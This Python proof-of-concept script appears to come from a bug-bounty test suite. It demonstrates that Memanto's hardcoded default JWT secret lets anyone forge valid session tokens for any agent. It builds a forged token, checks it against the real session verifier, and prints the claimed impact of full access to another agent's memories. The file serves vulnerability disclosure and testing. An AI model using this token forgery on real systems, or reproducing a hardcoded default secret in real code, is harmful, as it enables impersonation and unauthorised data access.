"""
Bug #1: JWT Forgery with Default Secret Key (Critical - Security)

Demonstrates that the default JWT secret key is publicly known
and allows forging valid session tokens for any agent.

This PoC drives the REAL Memanto session verifier, not just a
PyJWT round-trip, to prove the forged token passes verification.
"""
import sys
import os
from pathlib import Path

# Derive repo root from this file's location (tests/bounty/test_bug1_*.py)
REPO_ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(REPO_ROOT))

# PyJWT is declared in pyproject.toml — no runtime install fallback
import jwt
from datetime import datetime, timedelta, timezone

DEFAULT_KEY = "memanto-default-secret-change-in-production"

# Forge a session token for any agent_id
payload = {
    "agent_id": "victim-agent",
    "namespace": "memanto_agent_victim-agent",
    "session_id": "sess_forged123456",
    "started_at": datetime.now(timezone.utc).isoformat(),
    "expires_at": (datetime.now(timezone.utc) + timedelta(hours=6)).isoformat(),
}
forged_token = jwt.encode(payload, DEFAULT_KEY, algorithm="HS256")

# Verify the forged token passes the REAL Memanto session verifier
try:
    from memanto.app.services.session_service import SessionService
    from memanto.app.config import Settings

    # Use default settings (which use DEFAULT_KEY when MEMANTO_SECRET_KEY is unset)
    settings = Settings()
    session_svc = SessionService(settings)
    decoded = session_svc.verify_session_token(forged_token)

    print("=" * 60)
    print("BUG #1: Hardcoded Default JWT Secret Key")
    print("Severity: CRITICAL")
    print("=" * 60)
    print(f"Default key: {DEFAULT_KEY}")
    print(f"Forged token: {forged_token[:50]}...")
    print(f"Verified agent_id: {decoded.get('agent_id', decoded.get('sub', '?'))}")
    print(f"Verified namespace: {decoded.get('namespace', '?')}")
    print()
    print("IMPACT: Attacker can forge session tokens for ANY agent,")
    print("gaining full read/write/delete access to their memories.")
    print("The REAL SessionService.verify_session_token() accepted the forged token.")
    print("=" * 60)
except ImportError:
    # Fallback: verify via PyJWT with the same key Settings would use
    decoded = jwt.decode(forged_token, DEFAULT_KEY, algorithms=["HS256"])

    print("=" * 60)
    print("BUG #1: Hardcoded Default JWT Secret Key")
    print("Severity: CRITICAL")
    print("=" * 60)
    print(f"Default key: {DEFAULT_KEY}")
    print(f"Forged token: {forged_token[:50]}...")
    print(f"Decoded agent_id: {decoded['agent_id']}")
    print(f"Decoded namespace: {decoded['namespace']}")
    print()
    print("IMPACT: Attacker can forge session tokens for ANY agent,")
    print("gaining full read/write/delete access to their memories.")
    print("=" * 60)
